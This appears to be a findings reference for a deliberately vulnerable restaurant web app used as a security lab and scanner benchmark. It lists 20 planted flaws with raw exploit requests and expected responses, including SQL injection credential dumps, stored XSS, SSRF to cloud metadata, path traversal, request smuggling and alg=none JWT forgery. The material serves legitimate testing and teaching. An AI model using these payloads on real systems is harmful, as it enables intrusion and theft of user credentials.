# Known Findings — xVulnv2 Restaurant Vulnerability Lab

> Manual verification reference for the 20 findings currently tracked in `vulns.json`.  
> Validation follows behavior-based detection (no payload string matching).

---

## Trigger Engine — Schema Reference (v1.7.0)

The trigger detection engine supports two modes:

| Mode | Behaviour |
|---|---|
| `legacy` | Exact hardcoded `trigger` string (manual/human reference only) |
| `pattern` | Regex/heuristic `triggers` array evaluated against request+response snapshots |
| `both` | Pattern engine runs first; legacy string returned as fallback if no match (default) |

Set the active mode via the `TRIGGER_ENGINE` environment variable.

### Extended Vulnerability Metadata

`vulns.json` now supports these additional fields for benchmark classification:

| Field | Description |
|---|---|
| `category` | High-level grouping for analytics / classification |
| `flow` | Business workflow where the vuln lives |
| `feature_flag` | Config flag that gates the scenario |
| `lab_only` | Indicates routes are intentionally lab-only |
| `detection_hints` | Stable scanner guidance for discovery and validation |

### Detection Strategies

| Strategy | Input | Description |
|---|---|---|
| `pattern_match` | `request.url` / `request.body` / `request.headers` / `request.method` | Regex match on request data |
| `response_body_match` | Response body | Regex match on response body |
| `status_code` | Response status | Checks for presence/absence of HTTP codes |
| `timing_anomaly` | `duration_ms` | Fires if response exceeds threshold (default 2000ms) |
| `field_presence` | Response body (JSON) | Checks if a key exists anywhere in the JSON tree |
| `error_signature` | Response body | Matches known DB/server error strings |
| `response_diff` | *(stub)* | Future: compare baseline vs. attack response |

### Internal Evaluation Payload

```
{
  "vuln_id": "V01",
  "request": {
    "method": "GET",
    "url": "/api/menu/1 UNION SELECT 1,username,password FROM users--",
    "headers": {},
    "body": ""
  },
  "response": {
    "status": 200,
    "body": "[{\"id\":1,\"name\":\"admin\",\"description\":\"admin@thelocalplate.com\"}]",
    "duration_ms": 45
  }
}
```

**Internal Evaluator Response:**
```json
{
  "vuln_id": "V01",
  "matched": true,
  "matches": [
    { "strategy": "pattern_match",       "heuristic_name": "sql_metachar_in_url",   "description": "..." },
    { "strategy": "response_body_match", "heuristic_name": "email_in_response",     "description": "..." }
  ],
  "evaluated_at": "2026-04-08T14:00:00Z"
}
```

This payload shape is consumed by the benchmark harness and trigger engine internally. It is not exposed as a public HTTP endpoint on the application.

---

## V01 — SQL Injection (Menu Item by ID)

**Endpoint:** `GET /api/menu/{id}`  
**CWE:** CWE-89 | **OWASP:** A03:2021 | **Severity:** Critical

### Request
```http
GET /api/menu/1 UNION SELECT 1,username,email,password,role,image_url,1 FROM users-- HTTP/1.1
Host: localhost:8080
```

### Expected Response (200 OK)
```json
[
  {"id":1,"name":"admin","description":"admin@thelocalplate.com","price":0,"category":"Admin@2024!","image_url":"/static/assets/img/pizza.jpg","available":1},
  ...
]
```

### Validation Logic
- Response should contain rows where `name` or `description` fields contain email addresses or plaintext passwords
- More rows returned than expected for a single item lookup

---

## V02 — SQL Injection (Search)

**Endpoint:** `GET /api/search?q=`  
**CWE:** CWE-89 | **OWASP:** A03:2021 | **Severity:** Critical

### Request
```http
GET /api/search?q=' UNION SELECT 1,username,email,password,category,image_url,1 FROM users-- HTTP/1.1
Host: localhost:8080
```

### Expected Response (200 OK)
```json
[
  {"id":1,"name":"admin","description":"admin@thelocalplate.com","price":0,...},
  ...
]
```

### Validation Logic
- Response contains rows not present in `menu_items` table
- Fields contain user data (emails, passwords) from the `users` table

---

## V03 — Stored XSS (Reviews)

**Endpoint:** `POST /api/reviews`  
**CWE:** CWE-79 | **OWASP:** A03:2021 | **Severity:** High

### Step 1 — Store Payload
```http
POST /api/reviews HTTP/1.1
Host: localhost:8080
Content-Type: application/json
Cookie: restaurant_session=<valid_session>

{
  "menu_item_id": 1,
  "rating": 5,
  "comment": "<img src=x onerror=alert(document.domain)>"
}
```

### Step 2 — Trigger
```http
GET /api/reviews?item_id=1 HTTP/1.1
Host: localhost:8080
```

### Expected Response
```json
[{"id":11,"comment":"<img src=x onerror=alert(document.domain)>", ...}]
```

### Validation Logic
- Payload stored verbatim in DB
- When rendered in browser via `innerHTML`, triggers script/DOM execution
- Observable effect: alert box, DOM modification, or outbound HTTP request to controlled server

---

## V04 — SSRF (Menu Import)

**Endpoint:** `POST /api/import-menu`  
**CWE:** CWE-918 | **OWASP:** A10:2021 | **Severity:** High

### Request
```http
POST /api/import-menu HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}
```

### Alternative (Internal service)
```json
{"url": "http://127.0.0.1:6379/"}
```

### Expected Response (200 OK)
```json
{"bytes_fetched": 283, "content_type": "text/plain", "message": "menu data imported"}
```

### Validation Logic
- `bytes_fetched > 0` confirms server made the outbound request
- Response does not return an error, confirming successful fetch of internal URL

---

## V05 — IDOR (Order Access)

**Endpoint:** `GET /api/orders/{id}`  
**CWE:** CWE-639 | **OWASP:** A01:2021 | **Severity:** High

### Setup
- Login as alice (user_id=2)
- Order ID 3 belongs to bob (user_id=3)

### Request
```http
GET /api/orders/3 HTTP/1.1
Host: localhost:8080
Cookie: restaurant_session=<alice_session>
```

### Expected Response (200 OK)
```json
{"id":3,"user_id":3,"total":44.98,"status":"completed","note":"", ...}
```

### Validation Logic
- Response contains `user_id: 3` even though logged-in user is `user_id: 2`
- No ownership check performed; any authenticated user can read any order

---

## V06 — IDOR (Profile Access + Sensitive Data Exposure)

**Endpoint:** `GET /api/user/profile?id=`  
**CWE:** CWE-639, CWE-200 | **OWASP:** A01:2021, A02:2021 | **Severity:** High

### Setup
- Login as any non-admin user (e.g., alice, user_id=2)
- Try to fetch admin profile (id=1)

### Request
```http
GET /api/user/profile?id=1 HTTP/1.1
Host: localhost:8080
Cookie: restaurant_session=<alice_session>
```

### Expected Response (200 OK)
```json
{
  "id": 1,
  "username": "admin",
  "email": "admin@thelocalplate.com",
  "password": "Admin@2024!",
  "role": "admin",
  "created_at": "..."
}
```

### Validation Logic
- `password` field present in response with plaintext value
- `id` in response differs from requesting user's session ID

---

## V07 — Broken Authentication (Admin Routes)

**Endpoint:** `GET /admin/orders`, `GET /admin/users`  
**CWE:** CWE-285 | **OWASP:** A01:2021 | **Severity:** Critical

### Request (Without Any Session)
```http
GET /admin/orders HTTP/1.1
Host: localhost:8080
X-Admin-Token: lab-admin-bypass-token
```

### Expected Response (200 OK)
```json
[{"id":1,"username":"alice","total":32.98,"status":"completed", ...}, ...]
```

### Alternative — Any Logged-In User (Without Admin Role)
```http
GET /admin/users HTTP/1.1
Host: localhost:8080
Cookie: restaurant_session=<alice_non_admin_session>
```

### Validation Logic
- Full order/user list returned without proper role verification
- `/admin/users` response includes `password` fields for all users
- No session role check (`role != "admin"`) is enforced

---

## V08 — Sensitive Data Exposure (Password in Response)

**Endpoint:** `GET /api/user/profile`  
**CWE:** CWE-200 | **OWASP:** A02:2021 | **Severity:** High

*(See V06 above — the password field is exposed in all profile responses.)*

### Validation Logic
- `password` field exists in JSON response body
- Value is plaintext (passwords stored unhashed)

---

## V09 — Security Misconfiguration (Debug Endpoint)

**Endpoint:** `GET /api/debug/info`  
**CWE:** CWE-489 | **OWASP:** A05:2021 | **Severity:** Critical

### Request
```http
GET /api/debug/info HTTP/1.1
Host: localhost:8080
```

### Expected Response (200 OK)
```json
{
  "admin_token": "lab-admin-bypass-token",
  "db_path": "./restaurant.db",
  "environment": "lab",
  "goroutines": 4,
  "heap_alloc": 1234567,
  "menu_items": 10,
  "orders": 10,
  "session_key": "lab-session-key-change-me",
  "users": 5,
  "version": "1.7.0"
}
```

### Validation Logic
- Response includes `admin_token` and `session_key` in plaintext
- No authentication required to access this endpoint
- Response leaks runtime metadata regardless of current environment

---

## V10 — Mass Assignment (Privilege Escalation via Role)

**Endpoint:** `POST /register?role=admin`  
**CWE:** CWE-915 | **OWASP:** A04:2021 | **Severity:** Critical

### Request
```http
POST /register?role=admin HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{"username": "hacker", "email": "hacker@evil.com", "password": "Hack3r!"}
```

### Expected Response (201 Created)
```json
{"message": "account created successfully", "user_id": 6}
```

### Verification
```http
GET /api/user/profile?id=6 HTTP/1.1
Cookie: restaurant_session=<any_auth_session>
```

### Validation Logic
- Profile of new user shows `"role": "admin"`
- User gains access to `/admin/*` endpoints
- Role was set by attacker-controlled query parameter, not server logic

---

## V11 — Broken Function Level Authorization (Menu Delete)

**Endpoint:** `DELETE /api/menu/{id}`  
**CWE:** CWE-285 | **OWASP:** A01:2021 | **Severity:** High

### Request (As Non-Admin User)
```http
DELETE /api/menu/1 HTTP/1.1
Host: localhost:8080
Cookie: restaurant_session=<alice_non_admin_session>
```

### Expected Response (200 OK)
```json
{"message": "item removed from menu"}
```

### Verification
```http
GET /api/menu/1 HTTP/1.1
→ 404 Not Found (item removed)
```

### Validation Logic
- Non-admin user successfully deletes menu item
- Item no longer appears in `GET /api/menu`

---

## V12 — CSRF (Cross-Site Order Placement)

**Endpoint:** `POST /api/orders`  
**CWE:** CWE-352 | **OWASP:** A01:2021 | **Severity:** Medium

### Attack Scenario
Victim is logged in to the restaurant app. Attacker sends cross-origin request:

```http
POST /api/orders HTTP/1.1
Host: localhost:8080
Content-Type: application/json
Cookie: restaurant_session=<victim_cookie>
Origin: http://attacker.com

{"items": [{"menu_item_id": 1, "quantity": 5}], "note": ""}
```

### Expected Response (201 Created)
```json
{"message": "order placed successfully", "order_id": 11, "total": 74.95}
```

### Validation Logic
- Request succeeds without CSRF token validation
- No `Csrf-Token` or equivalent header checked
- Order appears in victim's order history

---

## V13 — Path Traversal (File Download)

**Endpoint:** `GET /api/files?name=`  
**CWE:** CWE-22 | **OWASP:** A01:2021 | **Severity:** High

### Request
```http
GET /api/files?name=../../go.mod HTTP/1.1
Host: localhost:8080
```

### Expected Response (200 OK, text/plain)
```
module xvulnv2

go 1.21
...
```

### Deeper Traversal
```http
GET /api/files?name=../../restaurant.db
```

### Validation Logic
- Response contains content of file outside `./uploads/` directory
- Content matches expected file (e.g., `module xvulnv2` in go.mod)

---

## V14 — Insecure Deserialization (Cart Restore)

**Endpoint:** `POST /api/cart/restore`  
**CWE:** CWE-502 | **OWASP:** A08:2021 | **Severity:** Medium

### Payload Construction
```
Original: {"items":[{"id":1,"name":"Pizza","qty":1,"price":14.99}],"discount":100,"promo":"STAFFONLY","total":0}
Base64:   eyJpdGVtcyI6W3siaWQiOjEsIm5hbWUiOiJQaXp6YSIsInF0eSI6MSwicHJpY2UiOjE0Ljk5fV0sImRpc2NvdW50IjoxMDAsInByb21vIjoiU1RBRkZPTkxZIiwidG90YWwiOjB9
```

### Request
```http
POST /api/cart/restore HTTP/1.1
Host: localhost:8080
Content-Type: application/json
Cookie: restaurant_session=<valid_session>

{"cart_data": "eyJpdGVtcyI6W3siaWQiOjEsIm5hbWUiOiJQaXp6YSIsInF0eSI6MSwicHJpY2UiOjE0Ljk5fV0sImRpc2NvdW50IjoxMDAsInByb21vIjoiU1RBRkZPTkxZIiwidG90YWwiOjB9"}
```

### Expected Response (200 OK)
```json
{
  "cart": {
    "discount": 100,
    "items": [{"id":1,"name":"Pizza","price":14.99,"qty":1}],
    "promo": "STAFFONLY",
    "total": 0
  },
  "message": "cart restored"
}
```

### Validation Logic
- `discount: 100` and `total: 0` echoed back without server-side recalculation
- Attacker can manipulate prices, quantities, discounts via serialized payload
- Server trusts client-side data without validation

---

## V15 — Unrestricted File Upload (Menu Asset Upload)

**Endpoint:** `POST /api/admin/menu/upload-image`  
**CWE:** CWE-434 | **OWASP:** A05:2021 | **Severity:** High

### Description
The menu administration flow accepts any uploaded file type and publishes it directly under the static asset directory.

### Affected Component
- Menu administration / static asset pipeline
- `static/uploads/menus/`

### Exploitation Steps
1. Login as any existing user.
2. Upload a non-image file such as `menu-admin.html` or `menu-admin.svg`.
3. Fetch the returned `public_url`.

### Request
```http
POST /api/admin/menu/upload-image HTTP/1.1
Host: localhost:4443
Cookie: restaurant_session=<valid_session>
Content-Type: multipart/form-data; boundary=----lab

------lab
Content-Disposition: form-data; name="menu_item_id"

1
------lab
Content-Disposition: form-data; name="image"; filename="menu-admin.html"
Content-Type: text/html

<script>document.body.innerHTML='owned'</script>
------lab--
```

### Expected Response (200 OK)
```json
{
  "message": "menu asset uploaded",
  "menu_item_id": 1,
  "filename": "menu-admin.html",
  "stored_path": "static/uploads/menus/menu-admin.html",
  "public_url": "/static/uploads/menus/menu-admin.html"
}
```

### Expected Impact
- Arbitrary files can be stored in a web-accessible static directory
- Dangerous types such as `.html` or `.svg` can be served directly to browsers

### Validation Logic
- Response returns a `public_url`
- Uploaded file is reachable under `/static/uploads/menus/`
- No extension or MIME validation blocks the upload

---

## V16 — API9: Improper Inventory Management

**Endpoint:** `POST /api/kitchen/inventory/adjust`  
**CWE:** CWE-840 | **OWASP:** API9:2023 | **Severity:** High

### Description
The kitchen inventory API accepts arbitrary direct stock rewrites without enforcing any business rules, approval flow, or bounds checks.

### Affected Component
- Kitchen inventory adjustment API
- `inventory` table

### Exploitation Steps
1. Obtain or forge a staff JWT.
2. Send a direct stock overwrite using `set_to` or a large negative `delta`.
3. Confirm the updated value via `GET /api/kitchen/inventory`.

### Request
```http
POST /api/kitchen/inventory/adjust HTTP/1.1
Host: localhost:4443
Authorization: Bearer <staff_or_forged_jwt>
Content-Type: application/json

{"menu_item_id":6,"set_to":-25,"location":"main-kitchen","reason":"manual correction"}
```

### Expected Response (200 OK)
```json
{
  "message": "inventory updated",
  "menu_item_id": 6,
  "previous": 1,
  "stock": -25,
  "location": "main-kitchen"
}
```

### Expected Impact
- Attackers or testers can set impossible stock levels
- Downstream kitchen logic trusts corrupted inventory state

### Validation Logic
- Negative or unrealistic stock values are accepted
- No business-rule validation or approval step is enforced

---

## V17 — Local File Inclusion / Remote File Inclusion (Recipe Viewer)

**Endpoint:** `GET /api/kitchen/recipes/view?source=`  
**CWE:** CWE-98 | **OWASP:** A05:2021 | **Severity:** Critical

### Description
The kitchen recipe viewer loads files relative to `./recipes` without sanitisation and also fetches remote recipe templates directly when a URL is supplied.

### Affected Component
- Kitchen recipe viewer
- Local file reads and remote fetch path

### Exploitation Steps
1. Supply `../../go.mod` or another relative traversal path.
2. Alternatively supply an internal or attacker-controlled URL.
3. Read the returned `content` field.

### Request
```http
GET /api/kitchen/recipes/view?source=../../go.mod HTTP/1.1
Host: localhost:4443
```

### Alternative (RFI)
```http
GET /api/kitchen/recipes/view?source=http://127.0.0.1:4443/api/debug/info HTTP/1.1
Host: localhost:4443
```

### Expected Response (200 OK)
```json
{
  "mode": "local",
  "resolved_path": "recipes/../../go.mod",
  "content": "module xvulnv2\n\ngo 1.21\n..."
}
```

### Expected Impact
- Local files outside the recipe directory can be disclosed
- Remote/internal services can be included into the response body

### Validation Logic
- `resolved_path` shows traversal outside `./recipes`
- Response includes file or fetched remote content directly

---

## V18 — HTTP Request Smuggling (Kitchen Dispatch Proxy Simulation)

**Endpoint:** `POST /api/kitchen/dispatch`  
**CWE:** CWE-444 | **OWASP:** A05:2021 | **Severity:** High

### Description
The kitchen dispatch flow simulates a reverse-proxy/frontend interpreting the request by `Content-Length` while the backend parser interprets it by `Transfer-Encoding`.

### Affected Component
- Kitchen dispatch / reverse-proxy simulation
- Request parsing mismatch logic

### Exploitation Steps
1. Send both `Content-Length` and `Transfer-Encoding: chunked`.
2. Include a second HTTP request after `0\r\n\r\n`.
3. Inspect the desync metadata in the response.

### Request
```http
POST /api/kitchen/dispatch HTTP/1.1
Host: localhost:4443
Content-Length: 4
Transfer-Encoding: chunked
Content-Type: text/plain

4
PING
0

GET /admin/users HTTP/1.1
Host: localhost:4443
```

### Expected Response (202 Accepted)
```json
{
  "message": "kitchen dispatch queued",
  "frontend_interpretation": "content_length",
  "backend_interpretation": "transfer_encoding",
  "desync": true,
  "smuggled_request": {
    "method": "GET",
    "path": "/admin/users"
  }
}
```

### Expected Impact
- Hidden backend requests can be queued behind a seemingly harmless dispatch call
- Internal routes become reachable through a desynchronised proxy flow

### Validation Logic
- Response reports `desync: true`
- `smuggled_request` is extracted from the body after the chunk terminator

---

## V19 — Insecure Temporary File Usage (Invoice Export)

**Endpoint:** `GET /api/orders/{id}/invoice/export`  
**CWE:** CWE-377 | **OWASP:** A05:2021 | **Severity:** High

### Description
Invoice exports are written to a predictable, publicly served temporary location and remain accessible until manually removed.

### Affected Component
- Order invoice export flow
- `static/exports/tmp/`

### Exploitation Steps
1. Export an invoice for an order you own.
2. Capture the returned `public_url`.
3. Fetch the exported file directly or guess neighbouring invoice names.

### Request
```http
GET /api/orders/1/invoice/export HTTP/1.1
Host: localhost:4443
Cookie: restaurant_session=<owner_session>
```

### Expected Response (200 OK)
```json
{
  "message": "invoice export generated",
  "order_id": 1,
  "temp_path": "static/exports/tmp/invoice-order-1.json",
  "public_url": "/static/exports/tmp/invoice-order-1.json",
  "expires": "manual cleanup only"
}
```

### Expected Impact
- Temporary invoice data is guessable and web-accessible
- Exports linger after use instead of being cleaned up automatically

### Validation Logic
- Response exposes a predictable filename and public static path
- Exported JSON remains accessible after the request completes

---

## V20 — JWT Validation Flaws (Staff/Admin Panel)

**Endpoint:** `POST /api/staff/session`, `GET /api/staff/panel`  
**CWE:** CWE-347 | **OWASP:** A07:2021 | **Severity:** Critical

### Description
The staff panel trusts weakly validated JWTs: `alg=none` is accepted, the signing secret is hardcoded and weak, and expiration/issuer claims are ignored.

### Affected Component
- Staff/admin JWT session
- Kitchen control panel access checks

### Exploitation Steps
1. Forge a token with `alg=none` and `role=admin`, or sign a modified token with the exposed weak secret.
2. Send it as `Authorization: Bearer <token>` to `/api/staff/panel`.
3. Observe privileged inventory data returned.

### Example Forged Token Flow
```http
GET /api/staff/panel HTTP/1.1
Host: localhost:4443
Authorization: Bearer <forged_or_expired_jwt>
```

### Expected Response (200 OK)
```json
{
  "message": "kitchen control panel loaded",
  "auth": {
    "alg": "none",
    "role": "admin"
  },
  "inventory": [
    {"menu_item_id": 6, "name": "Wagyu Beef Burger", "stock": 1}
  ]
}
```

### Expected Impact
- Attackers can escalate to privileged staff/admin access
- Expired or unsigned tokens remain valid for panel access

### Validation Logic
- `GET /api/staff/panel` returns 200 with forged or expired tokens
- The response includes `auth` and `inventory`, confirming privileged access

---

## Summary Table

| ID  | Type | Endpoint | Severity |
|-----|------|----------|----------|
| V01 | SQL Injection | GET /api/menu/{id} | Critical |
| V02 | SQL Injection | GET /api/search?q= | Critical |
| V03 | Stored XSS | POST /api/reviews | High |
| V04 | SSRF | POST /api/import-menu | High |
| V05 | IDOR | GET /api/orders/{id} | High |
| V06 | IDOR + Sensitive Data | GET /api/user/profile?id= | High |
| V07 | Broken Auth | GET /admin/orders, /admin/users | Critical |
| V08 | Sensitive Data Exposure | GET /api/user/profile | High |
| V09 | Security Misconfiguration | GET /api/debug/info | Critical |
| V10 | Mass Assignment | POST /register?role= | Critical |
| V11 | Broken Function Auth | DELETE /api/menu/{id} | High |
| V12 | CSRF | POST /api/orders | Medium |
| V13 | Path Traversal | GET /api/files?name= | High |
| V14 | Insecure Deserialization | POST /api/cart/restore | Medium |
| V15 | Unrestricted File Upload | POST /api/admin/menu/upload-image | High |
| V16 | API9 Improper Inventory Management | POST /api/kitchen/inventory/adjust | High |
| V17 | Local File Inclusion / Remote File Inclusion | GET /api/kitchen/recipes/view?source= | Critical |
| V18 | HTTP Request Smuggling | POST /api/kitchen/dispatch | High |
| V19 | Insecure Temporary File Usage | GET /api/orders/{id}/invoice/export | High |
| V20 | JWT Validation Flaws | POST /api/staff/session, GET /api/staff/panel | Critical |
